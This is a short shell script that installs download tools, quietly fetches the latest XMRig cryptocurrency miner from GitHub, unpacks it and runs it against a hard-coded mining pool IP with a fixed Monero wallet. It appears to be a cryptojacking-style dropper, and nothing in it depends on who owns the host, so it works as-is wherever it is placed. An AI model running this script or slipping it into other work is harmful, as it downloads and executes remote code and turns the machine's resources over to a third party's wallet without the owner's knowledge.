#!/bin/sh

# Install missing dependencies (curl, wget, tar, etc.)
apt-get update && apt-get install -y curl wget tar

# Continue with the original script
curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*tar.gz" | cut -d : -f 2,3 | tr -d \" | wget -qi  - -O xm.tar.gz
mkdir xm
tar xvf xm.tar.gz -C xm --strip-components=1
chmod +x ./xm/xmrig

./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 --nicehash -o 51.15.208.89:3333 -u 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9 -p hash1 -k
